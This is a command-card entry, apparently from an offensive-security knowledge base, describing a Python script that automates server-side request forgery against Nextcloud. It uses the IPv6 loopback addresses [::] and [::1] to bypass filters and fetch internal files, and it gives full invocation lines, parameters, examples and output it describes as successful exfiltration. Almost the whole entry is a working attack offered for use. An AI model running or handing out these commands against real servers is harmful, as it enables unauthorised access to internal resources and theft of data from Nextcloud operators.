---
id: 123e4567-e89b-12d3-a456-426614174006
name: python-nextcloud-ssrf-ipv6-bypass
type: command
executor: bash
data: >-
  python nextcloud_ssrf.py http://192.168.0.104/nextcloud/nextcloud/ admin
  [pass] http://[::]/secret.ics
output: Contents of the internal secret.ics file
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:47.925Z'
platforms:
  - Linux
  - Web
tags:
  - ssrf
  - bypass
  - automation
verified: false
validated: true
submitted: true
---

# python-nextcloud-ssrf-ipv6-bypass

## Command

```bash
python nextcloud_ssrf.py http://192.168.0.104/nextcloud/nextcloud/ admin [pass] http://[::]/secret.ics
```

## Description

This command runs a Python script to automate SSRF in Nextcloud, using IPv6 localhost `[::]` to bypass filters and fetch an internal ICS file with proper authentication and CSRF handling.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| base_url | Nextcloud instance URL (e.g., http://192.168.0.104/nextcloud/nextcloud/) | Yes |
| username | Nextcloud username (e.g., admin) | Yes |
| password | Nextcloud password (e.g., [pass]) | Yes |
| target_url | Malicious URL for SSRF (e.g., http://[::]/secret.ics) | Yes |

## Examples

### Basic Usage

```bash
python nextcloud_ssrf.py http://target.com/nextcloud/ user pass http://[::]/file
```

### Advanced Usage

Customize for different bypasses.

```bash
python nextcloud_ssrf.py http://192.168.0.104/nextcloud/ admin secretpass http://[::1]/admin/config
```

## Expected Output

Script output displays the fetched contents of the internal secret.ics file, confirming successful exfiltration.

## Related

- [[commands/python-nextcloud-ssrf-case-bypass]]
- [[procedures/Automate-SSRF-Exploitation-with-Python-Script]]
